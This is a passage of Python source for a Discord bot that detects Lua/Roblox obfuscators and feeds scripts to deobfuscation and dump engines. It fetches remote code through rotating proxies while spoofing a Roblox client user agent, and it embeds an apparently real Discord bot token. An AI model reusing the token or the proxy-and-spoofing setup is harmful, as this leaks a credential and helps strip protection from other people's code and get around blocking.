    \"return\", \"while\", \"true\", \"false\", \"then\", \"else\", \"end\", \"for\", \"do\",
    \"not\", \"and\", \"or\", \"nil\", \"getfenv\", \"setfenv\", \"require\", \"game\",
    \"script\", \"workspace\", \"bytecode\", \"vm\", \"obfuscator\", \"prometheus\",
}


def _mask_lua_comments(text: str) -> str:
    \"\"\"Replace Lua comments with spaces while preserving source positions.\"\"\"
    if not isinstance(text, str):
        return \"\"
    try:
        text = re.sub(r\"--\\[\\[.*?\\]\\]\", lambda m: \" \" * len(m.group(0)),
                      text, flags=re.S)
        return re.sub(r\"--[^\\n\\r]*\", lambda m: \" \" * len(m.group(0)), text)
    except re.error:
        return text


def _detection_windows(text: str, width: int = DETECTION_WINDOW_SIZE) -> list:
    \"\"\"Return first, middle, final, and evenly distributed source windows.\"\"\"
    text = str(text or \"\")
    if not text:
        return []
    width = max(1, int(width))
    if len(text) <= width:
        return [text]
    n = len(text)
    starts = [
        0,
        max(0, n // 8 - width // 2),
        max(0, n // 4 - width // 2),
        max(0, 3 * n // 8 - width // 2),
        max(0, n // 2 - width // 2),
        max(0, 5 * n // 8 - width // 2),
        max(0, 3 * n // 4 - width // 2),
        max(0, 7 * n // 8 - width // 2),
        max(0, n - width),
    ]
    result = []
    for start in starts:
        window = text[start:start + width]
        if window and window not in result:
            result.append(window)
    return result


def _normalize_detection_signature(text: str) -> str:
    \"\"\"Normalize a stored/current 100-character window for similarity matching.\"\"\"
    masked = _mask_lua_comments(str(text or \"\")).lower()
    return re.sub(r\"\\s+\", \"\", masked)[:120]


MAX_SAMPLE_SETS = 32
MAX_SIGNATURES_PER_SAMPLE = 9
MAX_PATTERNS_PER_ENTRY = 128
MAX_DETECTOR_STATS_REGIONS = 12
DETECTION_MIN_CONFIDENCE = 65


def _safe_detector_recommendation(value: str, fallback: str = \".deobf\") -> str:
    value = str(value or \"\").strip().lower()
    deprecated = \".\" + \"lph\" + \"v2\"
    return fallback if value == deprecated else (value or fallback)


def _detection_window_regions(text: str, width: int = DETECTION_WINDOW_SIZE) -> list:
    \"\"\"Return bounded (region label, window) pairs for detector reporting.\"\"\"
    text = str(text or \"\")
    if not text:
        return []
    width = max(1, int(width))
    if len(text) <= width:
        return [(\"first/last\", text)]
    n = len(text)
    starts = [
        0,
        max(0, n // 8 - width // 2),
        max(0, n // 4 - width // 2),
        max(0, 3 * n // 8 - width // 2),
        max(0, n // 2 - width // 2),
        max(0, 5 * n // 8 - width // 2),
        max(0, 3 * n // 4 - width // 2),
        max(0, 7 * n // 8 - width // 2),
        max(0, n - width),
    ]
    pairs = []
    seen = set()
    for index, start in enumerate(starts):
        window = text[start:start + width]
        if not window or window in seen:
            continue
        seen.add(window)
        if index == 0:
            label = \"first-100\"
        elif index == len(starts) - 1:
            label = \"last-100\"
        else:
            label = f\"distributed-{index}\"
        pairs.append((label, window))
    return pairs


def _entry_sample_sets(data: dict) -> list:
    \"\"\"Read the multi-sample schema while accepting the older flat schema.\"\"\"
    if not isinstance(data, dict):
        return []
    raw_sets = data.get(\"sample_sets\", data.get(\"samples\", []))
    result = []
    if isinstance(raw_sets, dict):
        raw_sets = list(raw_sets.values())
    if isinstance(raw_sets, list):
        for sample in raw_sets:
            if not isinstance(sample, dict):
                continue
            signatures = sample.get(\"signatures\", sample.get(\"windows\", []))
            patterns = sample.get(\"patterns\", [])
            if isinstance(signatures, str):
                signatures = [signatures]
            if isinstance(patterns, str):
                patterns = [patterns]
            signatures = [str(value)[:DETECTION_WINDOW_SIZE] for value in (signatures or [])
                          if len(str(value)) >= 35]
            patterns = [str(value).strip() for value in (patterns or []) if str(value).strip()]
            if signatures or patterns:
                result.append({\"signatures\": signatures[:MAX_SIGNATURES_PER_SAMPLE],
                               \"patterns\": patterns[:MAX_PATTERNS_PER_ENTRY],
                               \"window_size\": DETECTION_WINDOW_SIZE})
    # Legacy entries had one flat signatures/windows list. Keep it usable as a
    # sample set until the next owner Save sample operation migrates it.
    if not result:
        signatures = data.get(\"signatures\", data.get(\"windows\", []))
        if isinstance(signatures, str):
            signatures = [signatures]
        signatures = [str(value)[:DETECTION_WINDOW_SIZE] for value in (signatures or [])
                      if len(str(value)) >= 35]
        if signatures:
            result.append({\"signatures\": signatures[:MAX_SIGNATURES_PER_SAMPLE],
                           \"patterns\": [], \"window_size\": DETECTION_WINDOW_SIZE})
    return result[-MAX_SAMPLE_SETS:]


def _signature_match_details(sample_sets, labeled_windows: list) -> tuple:
    \"\"\"Return confidence, matched labels, and matched signature count.\"\"\"
    if not labeled_windows:
        return 0, [], 0, None
    current = [(label, _normalize_detection_signature(window))
               for label, window in labeled_windows]
    best_result = (0, [], 0, None)
    for sample_index, sample in enumerate(sample_sets, start=1):
        signatures = sample.get(\"signatures\", []) if isinstance(sample, dict) else []
        matched = []
        for signature in signatures:
            stored = _normalize_detection_signature(signature)
            if len(stored) < 35 or len(set(stored)) < 8:
                continue
            best_label, best_ratio = max(
                ((label, SequenceMatcher(None, stored, window, autojunk=False).ratio())
                 for label, window in current if len(window) >= 35),
                key=lambda item: item[1], default=(None, 0.0))
            if best_ratio >= 0.78 and best_label:
                matched.append((best_label, best_ratio))
        strong = len(matched)
        # One similar header is not enough; require two distinct distributed
        # regions within the same sample set before it can identify an obfuscator.
        if strong < 2 or len({label for label, _ratio in matched}) < 2:
            continue
        matched.sort(key=lambda item: item[1], reverse=True)
        best_ratio = matched[0][1]
        if best_ratio < 0.72:
            continue
        confidence = min(92, 35 + int(best_ratio * 40) + min(15, (strong - 1) * 8))
        labels = []
        for label, _ratio in matched:
            if label not in labels:
                labels.append(label)
        candidate = (confidence, labels[:MAX_DETECTOR_STATS_REGIONS], strong, sample_index)
        if candidate[0] > best_result[0]:
            best_result = candidate
    return best_result


def _signature_match_score(signatures, windows: list) -> int:
    \"\"\"Compatibility wrapper for callers that only need the numeric score.\"\"\"
    if windows and windows and isinstance(windows[0], tuple):
        labeled = windows
    else:
        labeled = [(f\"window-{index + 1}\", value) for index, value in enumerate(windows or [])]
    return _signature_match_details([{\"signatures\": signatures}], labeled)[0]


def _pattern_match_score(pattern: str, source: str, windows: list) -> tuple:
    \"\"\"Return (score, occurrences, window_hits) for a literal DB pattern.\"\"\"
    pattern = str(pattern or \"\").strip().lower()
    if len(pattern) < 5 or pattern in _DETECTION_WEAK_PATTERNS:
        return 0, 0, 0
    source = str(source or \"\").lower()
    if not source or pattern not in source:
        return 0, 0, 0
    occurrences = 0
    cursor = 0
    while True:
        position = source.find(pattern, cursor)
        if position < 0:
            break
        occurrences += 1
        cursor = position + max(1, len(pattern))
    window_hits = sum(1 for window in windows if pattern in str(window).lower())
    score = 30 + min(20, max(0, len(pattern) - 5) * 2)
    distinctive = any(ch in pattern for ch in \"_\\\\[]{}():;=|$\")
    if distinctive:
        score += 20
    if re.search(r\"(?<![a-z0-9_])\" + re.escape(pattern) + r\"(?![a-z0-9_])\", source):
        score += 10
    if occurrences >= 2:
        score += 10
    if window_hits >= 2:
        score += 10
    if window_hits >= 3:
        score += 5
    return min(95, score), occurrences, window_hits


def _detector_result(name: str, data: dict, confidence: int, matched: dict = None) -> tuple:
    info = matched if isinstance(matched, dict) else {}
    info.setdefault(\"matched_regions\", [])
    info.setdefault(\"matched_pattern_count\", 0)
    info.setdefault(\"matched_signature_count\", 0)
    info.setdefault(\"matched_sample_set\", None)
    return (name, _safe_detector_recommendation(data.get(\"recommendation\", \"unknown\"), \"unknown\"),
            data.get(\"description\", name), data.get(\"notes\", \"\"),
            max(0, min(99, int(confidence))), info)


def _detect_obfuscator(lua_code: str) -> tuple:
    \"\"\"Return metadata plus bounded match details, or None below the threshold.\"\"\"
    if not isinstance(lua_code, str) or not lua_code.strip():
        return None
    scan_source = _mask_lua_comments(lua_code).lower()
    labeled_windows = _detection_window_regions(scan_source)
    windows = [window for _label, window in labeled_windows]
    candidates = []
    for name, data in obfuscator_db.items():
        if not isinstance(data, dict):
            continue
        patterns = data.get(\"patterns\", [])
        if isinstance(patterns, str):
            patterns = [patterns]
        elif not isinstance(patterns, (list, tuple)):
            patterns = []
        pattern_matches = []
        matched_regions = []
        for pat in patterns[:MAX_PATTERNS_PER_ENTRY]:
            score, occurrences, window_hits = _pattern_match_score(pat, scan_source, windows)
            if not score:
                continue
            pattern_text = str(pat).strip()
            regions = [label for label, window in labeled_windows
                       if pattern_text.lower() in window.lower()]
            if not regions:
                regions = [\"source-bounded\"]
            pattern_matches.append((score, occurrences, window_hits, pattern_text, regions))
            for region in regions:
                if region not in matched_regions:
                    matched_regions.append(region)
        pattern_matches.sort(reverse=True)
        pattern_confidence = 0
        if pattern_matches:
            best = pattern_matches[0][0]
            strong_count = sum(1 for score, _occ, _hits, _pat, _regions in pattern_matches
                               if score >= 55)
            pattern_confidence = best + min(20, max(0, strong_count - 1) * 10)
            if len(pattern_matches) >= 2:
                pattern_confidence += 5
            # A single broad/ordinary marker cannot identify an obfuscator.
            # A lone marker is allowed only when it is a clearly distinctive
            # long token; short/common patterns need another pattern or a
            # two-region signature match.
            if len(pattern_matches) == 1:
                score, occurrences, window_hits, pattern_text, _regions = pattern_matches[0]
                distinctive = any(ch in pattern_text.lower() for ch in \"_\\\\[]{}():;=|$\")
                if (not distinctive or len(pattern_text) < 8) and not (occurrences >= 2 and window_hits >= 2):
                    pattern_confidence = 0
        sample_sets = _entry_sample_sets(data)
        signature_confidence, signature_regions, signature_count, sample_index = _signature_match_details(
            sample_sets, labeled_windows)
        all_regions = list(matched_regions)
        for region in signature_regions:
            if region not in all_regions:
                all_regions.append(region)
        confidence = max(pattern_confidence, signature_confidence)
        if pattern_matches and signature_confidence:
            confidence = min(99, confidence + 8)
        if confidence >= DETECTION_MIN_CONFIDENCE:
            candidates.append((confidence, name, data, {
                \"matched_regions\": all_regions[:MAX_DETECTOR_STATS_REGIONS],
                \"matched_pattern_count\": min(len(pattern_matches), MAX_PATTERNS_PER_ENTRY),
                \"matched_signature_count\": min(signature_count, MAX_SIGNATURES_PER_SAMPLE),
                \"matched_sample_set\": sample_index,
            }))
    if candidates:
        confidence, name, data, info = max(candidates, key=lambda item: item[0])
        return _detector_result(name, data, confidence, info)

    # ---- Heuristic fallback (no sufficiently strong DB match) ----
    lower = scan_source
    hex_escapes = lower.count(\"\\\\x\")
    if (\"loadstring\" in lower and \"string.dump\" in lower) or \"vmstring\" in lower \\
            or (\"bytecode\" in lower and \"lph\" in lower):
        confidence = 86 if \"vmstring\" in lower else 78
        return (\"luraph (vm-style)\", \".lph\",
                \"Luraph / VM bytecode obfuscator\",
                \"detected via multiple VM/bytecode markers\", confidence,
                {\"matched_regions\": [label for label, _window in labeled_windows
                                    if label in {\"first-100\", \"last-100\"}],
                 \"matched_pattern_count\": 0, \"matched_signature_count\": 0,
                 \"matched_sample_set\": None})
    if (\"bit.bxor\" in lower or \"bit32.bxor\" in lower or \"bxor(\" in lower) and hex_escapes >= 5:
        return (\"xor / string-encoded\", \".deobf\",
                \"XOR / string-encoded obfuscation\",
                \"detected via bit.bxor + hex escape density\", 78,
                {\"matched_regions\": [label for label, _window in labeled_windows
                                    if \"bxor\" in _window.lower() or \"\\\\x\" in _window.lower()],
                 \"matched_pattern_count\": 0, \"matched_signature_count\": 0,
                 \"matched_sample_set\": None})
    if hex_escapes >= 15 and 64 >= DETECTION_MIN_CONFIDENCE:
        return (\"hex string array\", \".deobf\",
                \"Hex string-array obfuscation\",
                \"detected via high density of \\\\x escapes\", 64,
                {\"matched_regions\": [label for label, _window in labeled_windows
                                    if \"\\\\x\" in _window.lower()],
                 \"matched_pattern_count\": 0, \"matched_signature_count\": 0,
                 \"matched_sample_set\": None})
    if \"getfenv\" in lower and lower.count(\"loadstring\") >= 2 and 62 >= DETECTION_MIN_CONFIDENCE:
        return (\"generic loadstring obfuscation\", \".deobf\",
                \"Generic loadstring-based obfuscation\",
                \"detected via getfenv + repeated loadstring markers\", 62,
                {\"matched_regions\": [label for label, _window in labeled_windows
                                    if \"getfenv\" in _window.lower() or \"loadstring\" in _window.lower()],
                 \"matched_pattern_count\": 0, \"matched_signature_count\": 0,
                 \"matched_sample_set\": None})
    return None


def _record_detector_hit(name: str, info: dict, confidence: int) -> None:
    \"\"\"Record only bounded detector counters; never persist source content.\"\"\"
    entry = obfuscator_db.get(name)
    if not isinstance(entry, dict):
        return
    stats = entry.get(\"stats\")
    if not isinstance(stats, dict):
        stats = {}
    try:
        hits = int(stats.get(\"hits\", 0))
    except (TypeError, ValueError):
        hits = 0
    stats[\"hits\"] = min(10**9, max(0, hits) + 1)
    stats[\"last_hit\"] = int(time.time())
    stats[\"last_confidence\"] = max(0, min(99, int(confidence)))
    regions = stats.get(\"region_hits\")
    if not isinstance(regions, dict):
        regions = {}
    for region in (info or {}).get(\"matched_regions\", [])[:MAX_DETECTOR_STATS_REGIONS]:
        region = str(region)[:40]
        try:
            regions[region] = min(10**9, int(regions.get(region, 0)) + 1)
        except (TypeError, ValueError):
            regions[region] = 1
    # Keep region labels bounded even if a future matcher adds new labels.
    stats[\"region_hits\"] = dict(list(regions.items())[:MAX_DETECTOR_STATS_REGIONS])
    entry[\"stats\"] = stats
    _save_obfuscator_db(obfuscator_db)


def _looks_plain(lua_code: str) -> bool:
    lower = lua_code.lower()
    if not lower.strip():
        return False
    if \"loadstring\" in lower or \"string.dump\" in lower or \"bxor\" in lower:
        return False
    if lower.count(\"\\\\x\") >= 5:
        return False
    return any(k in lower for k in (\"local \", \"function\", \"print\", \"end\", \"--\"))

# =========================
# CLEAN UA ROTATOR (IP spoofing removed - it caused 403s)
# =========================
# Main fetch requests use Roblox's UA (Roblox/WinInet) as requested.
ROBLOX_UAS = [
    \"Roblox/WinInet\",
    \"Roblox/WinInet\",
    \"RobloxStudio/WinInet\",
    \"Roblox/WinInet\",
]

# Internal API calls (Pastefy, LeakD) keep a normal browser UA.
BROWSER_UAS = [
    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\",
    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\",
    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\",
    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15\",
    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\",
    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0\",
]

def _pick_ua() -> str:
    return random.choice(BROWSER_UAS)

def _pick_roblox_ua() -> str:
    return random.choice(ROBLOX_UAS)

def _normalize_fetch_url(url: str) -> str:
    \"\"\"Convert GitHub blob/raw pages into raw URLs and strip trailing junk.\"\"\"
    u = url.strip()
    # https://github.com/owner/repo/blob/BRANCH/path -> raw.githubusercontent.com
    m = re.match(
        r'^https?://(?:www\\.)?github\\.com/([^/]+)/([^/]+)/(?:blob|raw)/([^/]+)/(.+)$',
        u, re.I
    )
    if m:
        owner, repo, branch, path = m.group(1), m.group(2), m.group(3), m.group(4)
        return f\"https://raw.githubusercontent.com/{owner}/{repo}/{branch}/{path}\"
    return u

def _clean_headers(extra: dict = None) -> dict:
    headers = {
        \"User-Agent\": _pick_roblox_ua(),
        \"Accept\": \"text/plain, */*;q=0.8\",
        \"Accept-Language\": \"en-US,en;q=0.9\",
        \"Accept-Encoding\": \"gzip, deflate, br\",
        \"Connection\": \"keep-alive\",
        \"Cache-Control\": \"no-cache\",
    }
    if extra:
        headers.update(extra)
    return headers

# =========================
# PROXY MANAGER
# =========================
PROXY_VERIFY_URL  = \"https://discord.com/api/v10/gateway\"
PROXY_CONCURRENCY = 40
PROXY_TIMEOUT     = 4.0
PROXY_CONNECT_TO  = 3.0
PROXY_FAIL_LIMIT  = 10

try:
    from aiohttp_socks import ProxyConnector
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

def _load_proxy_list() -> list:
    try:
        raw = PROXIES_FILE.read_text(encoding=\"utf-8\")
        return [l.strip() for l in raw.splitlines()
                if l.strip() and not l.strip().startswith(\"#\")]
    except FileNotFoundError:
        return []
    except Exception:
        return []

async def _proxy_works(proxy_url: str) -> bool:
    connector = None
    try:
        if SOCKS_AVAILABLE:
            url = proxy_url if \"://\" in proxy_url else f\"http://{proxy_url}\"
            connector = ProxyConnector.from_url(url, ssl=False)
            timeout = aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=PROXY_CONNECT_TO)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(PROXY_VERIFY_URL, ssl=False) as r:
                    return r.status < 400
        else:
            url = proxy_url if proxy_url.startswith(\"http\") else f\"http://{proxy_url}\"
            timeout = aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=PROXY_CONNECT_TO)
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(PROXY_VERIFY_URL, proxy=url, ssl=False) as r:
                    return r.status < 400
    except Exception:
        return False
    finally:
        if connector and not connector.closed:
            await connector.close()

async def _verify_proxies(raw: list) -> list:
    sem = asyncio.Semaphore(PROXY_CONCURRENCY)
    working = []
    async def check(p: str):
        async with sem:
            ok = await _proxy_works(p)
        if ok:
            url = p if \"://\" in p else f\"http://{p}\"
            working.append(url)
    await asyncio.gather(*[check(p) for p in raw])
    return working

class RotatingProxyManager:
    def __init__(self):
        self._proxies = []
        self._raw = []
        self._index = 0
        self._lock = threading.Lock()
        self._fail_counts = {}
        self._blacklist = set()
        self.ready = False
        self._last_reload = None

    async def load(self):
        await self._do_load()
        self.ready = True

    async def reload(self) -> tuple:
        return await self._do_load()

    def next(self):
        if not self._proxies:
            return None
        with self._lock:
            url = self._proxies[self._index % len(self._proxies)]
            self._index = (self._index + 1) % len(self._proxies)
        return url

    def get_connector(self):
        proxy_url = self.next()
        if proxy_url is None:
            return aiohttp.TCPConnector(ssl=False), None
        if SOCKS_AVAILABLE:
            try:
                connector = ProxyConnector.from_url(proxy_url, ssl=False)
                return connector, proxy_url
            except Exception:
                return aiohttp.TCPConnector(ssl=False), None
        return aiohttp.TCPConnector(ssl=False), proxy_url

    def report_success(self, proxy_url: str):
        if proxy_url:
            with self._lock:
                self._fail_counts[proxy_url] = 0

    def report_fail(self, proxy_url: str):
        if not proxy_url: return
        with self._lock:
            count = self._fail_counts.get(proxy_url, 0) + 1
            self._fail_counts[proxy_url] = count
            if count >= PROXY_FAIL_LIMIT:
                self._blacklist.add(proxy_url)
                if proxy_url in self._proxies:
                    self._proxies.remove(proxy_url)

    def count(self) -> int: return len(self._proxies)
    def all_proxies(self) -> list:
        with self._lock: return list(self._proxies)
    def blacklisted(self) -> list: return list(self._blacklist)
    def blacklist_count(self) -> int: return len(self._blacklist)
    def clear_blacklist(self):
        self._blacklist.clear()
        self._fail_counts.clear()
    def last_reload_str(self) -> str:
        if self._last_reload is None: return \"never\"
        return self._last_reload.strftime(\"%Y-%m-%d %H:%M:%S\")

    async def _do_load(self) -> tuple:
        raw = _load_proxy_list()
        total = len(raw)
        if not raw:
            with self._lock:
                self._proxies = []
                self._raw = []
                self._index = 0
            self._last_reload = datetime.now()
            return 0, 0
        working = await _verify_proxies(raw)
        working = [p for p in working if p not in self._blacklist]
        with self._lock:
            self._proxies = working
            self._raw = raw
            self._index = 0
            for p in working:
                self._fail_counts.pop(p, None)
        self._last_reload = datetime.now()
        return len(working), total

proxy_manager = RotatingProxyManager()


def _required_requests_proxy():
    \"\"\"Return a verified proxy for synchronous HTTP; fail closed if absent.\"\"\"
    proxy_url = proxy_manager.next()
    if not proxy_url:
        raise RuntimeError(\"no verified outbound proxy is available\")
    return proxy_url, {\"http\": proxy_url, \"https\": proxy_url}


async def auto_reload_proxies():
    await bot.wait_until_ready()
    while True:
        await asyncio.sleep(30 * 60)
        await proxy_manager.reload()

# =========================
# ENGINE MAP
# =========================
ENGINE_MAP = {
    \"v1\":       \"v1.lua\",
    \"v2\":       \"v2.lua\",
    \"v3\":       \"v3.lua\",
    \"deobf\":    \"deo.lua\",
    \"wyn\":      \"wyn.lua\",
    \"constant\": \"constant.lua\",
}

# =========================
# SANITIZE & MOJIBAKE FIX
# =========================
def _fix_mojibake(text: str) -> str:
    if not text:
        return text

    # 1) Repair classic \"UTF-8 bytes read as cp1252/latin-1\" mojibake
    #    (e.g. \"ƒ€š‚\" -> \"ƒ’‚\", \"-\" -> \"-\") - only when markers are present.
    #    cp1252 is used because real mojibake contains chars like ƒ€š‚ ƒ€‚“ ƒ‚‚ ƒ€...€œ
    #    that only exist in the cp1252 table, not in latin-1.
    if any(m in text for m in (\"\", \"\", \"-\", \"ƒ’‚\", \"ƒ’‚\", \"ƒ’‚œ\")):
        try:
            repaired = text.encode(\"cp1252\").decode(\"utf-8\")
            if repaired != text and (
                repaired.count(\"\") + repaired.count(\"\")
                < text.count(\"\") + text.count(\"\")
            ):
                text = repaired
        except Exception:
            pass

    # 2) Targeted replacements (longer/specific first).
    replacements = [
        (\""\", '\"'),
        (\"-\\x9d\", '\"'),
        (\"'\", \"'\"),
        (\"'\", \"'\"),
        (\"-\", \"-\"),
        (\"-\", \"-\"),
        (\"ƒ€š‚\", \"ƒ€š‚\"),
        (\"-\", \"-\"),
        (\"->\", \"->\"),
        (\"\", \"\"),
        (\"\", \"\"),
        (\"\", \"\"),
    ]
    for bad, good in replacements:
        text = text.replace(bad, good)

    # 3) Normalize smart punctuation left over from the repair step.
    for bad, good in ((\"-\", \"-\"), (\"-\", \"-\"), (\"'\", \"'\"), (\"'\", \"'\"),
                      (\""\", '\"'), (\""\", '\"')):
        text = text.replace(bad, good)

    # 4) Strip leftover Latin-1 Supplement + C1 control chars
    #    (ƒ’‚, ƒ’€š, ƒ’‚, ƒ’‚œ, ƒ€š‚, ƒ€š‚ ƒ€š‚ = mojibake residue).
    text = re.sub(r'[\\u0080-\\u00ff]', '', text)

    # 5) Strip stray control chars (keep \\n and \\t).
    text = re.sub(r'[\\x00-\\x08\\x0b\\x0c\\x0e-\\x1f\\x7f]', '', text)
    return text

def _sanitize_error(text: str) -> str:
    if not text:
        return text
    if not sanitize_paths_enabled:
        return _mask_host_ip_leaks(_fix_mojibake(text.strip()))
    text = _fix_mojibake(text)
    text = re.sub(r'luauvmp', '[engine]', text, flags=re.I)
    text = re.sub(r'luauvm', '[engine]', text, flags=re.I)
    text = re.sub(r'File \"[^\"]+\",\\s*line\\s*\\d+,?\\s*in\\s*\\S+\\s*', '', text)
    text = re.sub(r'/[\\w/\\-\\.]+\\.(?:py|lua|luau)', '[script]', text)
    text = re.sub(r'[A-Za-z]:\\\\[\\w\\\\\\-\\.]+\\.(?:py|lua|luau)', '[script]', text)
    text = re.sub(r'/tmp/[\\w/\\-\\.]+', '[tmp]', text)
    return _mask_host_ip_leaks(text.strip())

# =========================
# ANTI-MENTION (untrusted text can never mass-ping)
# =========================
def _strip_mentions(text: str) -> str:
    \"\"\"Neutralize @everyone / @here / role & user mentions in UNTRUSTED
    (user-supplied) text. Embeds already block pings on Discord's side;
    this is the second safety layer so nothing can ping even if a string
    ends up outside an embed. Bot's own author mentions are never passed
    through this.\"\"\"
    if not text or not isinstance(text, str):
        return text
    text = _mask_host_ip_leaks(text)
    text = text.replace(\"@everyone\", \"@ everyone\")
    text = text.replace(\"@here\", \"@ here\")
    text = re.sub(r\"<@&(\\d+)>\", r\"< @&\\1>\", text)   # role mentions
    text = re.sub(r\"<@!?(\\d+)>\", r\"< @\\1>\", text)   # user mentions
    return text

# =========================
# PERMISSIONS
# =========================
try:
    os.chmod(LUNE_BIN, 0o755)
except Exception:
    pass
try:
    if LUTE.exists():
        os.chmod(str(LUTE), 0o755)
except Exception:
    pass

TOKEN = \"MTQzNzM4NjgwNzAxNTc2ODA4NA.G2Gwuo.JwUhcWhdcSlHPB7-389YpLev_EJ5TVnufeAUOM\"

ALLOWED_GUILD    = 1533326719530963045
ALLOWED_CHANNELS = {1533754619140771983}

if os.path.exists(LUNE_BIN):
    st = os.stat(LUNE_BIN)
    os.chmod(LUNE_BIN, st.st_mode | stat.S_IEXEC)

# =========================
# BOT SETUP
# =========================
intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages     = True
intents.guilds          = True
intents.members         = True
intents.moderation      = True

bot = commands.Bot(
    command_prefix=\".\",
    intents=intents,
    help_command=None,
    # ANTI MASS-PING: @everyone / @here / role mentions are never allowed
    # to ping, even if user-supplied text sneaks into one of our messages.
    allowed_mentions=discord.AllowedMentions(everyone=False, roles=False, users=True, replied_user=False),
)

dump_queue   = None
_background_tasks = {}
_background_thread = None
QUEUE_STATE_FILE = ROOT / \"queue_state.json\"
_queue_persist_lock = asyncio.Lock()
_queue_restored = False

LUA_CODEBLOCK = re.compile(r\"```(?:lua|luau)?\\s*(.*?)```\", re.S)
user_configs: dict = {}

DEFAULT_CONFIG = {
    \"hook_op\":          True,
    \"constants\":        False,
    \"pastefy_enabled\":  True,
}

def get_user_config(uid: int) -> dict:
    if uid not in user_configs:
        user_configs[uid] = DEFAULT_CONFIG.copy()
    return user_configs[uid]

def save_user_config(uid: int, cfg: dict):
    user_configs[uid] = cfg

def is_allowed(message) -> bool:
    if message.guild is None and message.author.id == OWNER_ID:
        return True
    if message.guild is None:
        return False
    if message.guild.id != ALLOWED_GUILD:
        return False
    if message.channel.id not in ALLOWED_CHANNELS:
        return False
    return True

# =========================
# RATE LIMIT HANDLER
# =========================
_rl_lock = asyncio.Lock()
_rl_reset_at: float = 0.0

async def _wait_rate_limit():
    global _rl_reset_at
    async with _rl_lock:
        now = time.time()
        if _rl_reset_at > now:
            await asyncio.sleep(_rl_reset_at - now + 0.5)

async def _handle_429_response(headers: dict, is_global: bool = False):
    global _rl_reset_at
    retry_after = float(headers.get('Retry-After', 2.0))
    if is_global:
        async with _rl_lock:
            _rl_reset_at = time.time() + retry_after
        await asyncio.sleep(retry_after)
    else:
        await asyncio.sleep(min(retry_after, 5.0) + random.uniform(0.1, 0.5))

async def _log_to_owner(title: str, description: str, color: int = ACCENT, fields: list = None):
    try:
        owner = await bot.fetch_user(OWNER_ID)
        dm = await owner.create_dm()
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.now())
        if fields:
            for name, value, inline in fields:
                embed.add_field(name=name, value=str(value)[:1000], inline=inline)
        embed.set_footer(text=\"KVms | Owner Log\")
        await dm.send(embed=embed)
    except Exception as e:
        print(f\"[OwnerLog] Failed: {e}\")

# =========================
# FETCH WITH URL CACHE (clean headers - 403 fixed)
# =========================
async def fetch_bytes_aiohttp(url: str) -> bytes:
    \"\"\"Fetch only through a verified proxy; never fall back to a direct socket.\"\"\"
    url = _normalize_fetch_url(url)
    cached = _cache_get(url)
    if cached is not None:
        return cached

    last_err = None
    for attempt in range(8):
        connector = None
        proxy_url = None
        try:
            if proxy_manager.count() <= 0:
                raise RuntimeError(\"no verified outbound proxy is available\")
            connector, proxy_url = proxy_manager.get_connector()
            # get_connector may fail to construct a SOCKS connector after the
            # count check.  Treat that as a closed circuit, never as direct IO.
            if not proxy_url:
                raise RuntimeError(\"no verified outbound proxy is available\")

            timeout = aiohttp.ClientTimeout(total=30)
            headers = _clean_headers()
            async with aiohttp.ClientSession(
                connector=connector, timeout=timeout, headers=headers
            ) as session:
                req_kw = {\"ssl\": False}
                if not SOCKS_AVAILABLE:
                    req_kw[\"proxy\"] = proxy_url
                async with session.get(url, **req_kw) as r:
                    if r.status == 429:
                        proxy_manager.report_fail(proxy_url)
                        await _handle_429_response(dict(r.headers))
                        last_err = RuntimeError(\"upstream rate limited the proxied fetch\")
                        continue
                    if r.status in (401, 403):
                        proxy_manager.report_fail(proxy_url)
                        last_err = RuntimeError(\"upstream rejected the proxied fetch\")
                        await asyncio.sleep(1.0 + attempt * 0.5)
                        continue
                    r.raise_for_status()
                    chunks, total_size = [], 0
                    async for part in r.content.iter_chunked(65536):
                        total_size += len(part)
                        if total_size > MAX_DL:
                            raise ValueError(\"File too large (max 8MB)\")
                        chunks.append(part)
                    proxy_manager.report_success(proxy_url)
                    data = b\"\".join(chunks)
                    _cache_set(url, data)
                    return data
        except ValueError:
            raise
        except Exception as e:
            last_err = e
            if proxy_url:
                proxy_manager.report_fail(proxy_url)
            await asyncio.sleep(min(1.0 + attempt * 0.25, 3.0))
        finally:
            if connector and not connector.closed:
                await connector.close()
    raise last_err or RuntimeError(\"all verified outbound proxies failed\")

async def fetch_from_url(url: str) -> bytes:
    return await fetch_bytes_aiohttp(url)

# =========================
# LPH RUNNERS
# =========================
def _collect_files_from_dir(directory: str, exclude: list = None) -> list:
    exclude = exclude or []
    exclude_abs = [os.path.abspath(p) for p in exclude]
    collected = []
    for root, dirs, files in os.walk(directory):
        for fname in sorted(files):
            fpath = os.path.join(root, fname)
            if os.path.abspath(fpath) in exclude_abs:
                continue
            rel = os.path.relpath(fpath, directory)
            collected.append((rel, fpath))
    return collected

def _read_file_safe(fpath: str) -> bytes:
    try:
        if os.path.getsize(fpath) > MAX_OUTPUT_BYTES:
            return b\"\"
        with open(fpath, \"rb\") as f:
            data = f.read(MAX_OUTPUT_BYTES + 1)
        if len(data) > MAX_OUTPUT_BYTES:
            return b\"\"
        return _clean_output_bytes(data, fpath)
    except Exception:
        return b\"\"

def _run_lph_script(lua_code: str) -> tuple:
    \"\"\"Run one LPH process and return (files, bounded raw panel error).\"\"\"
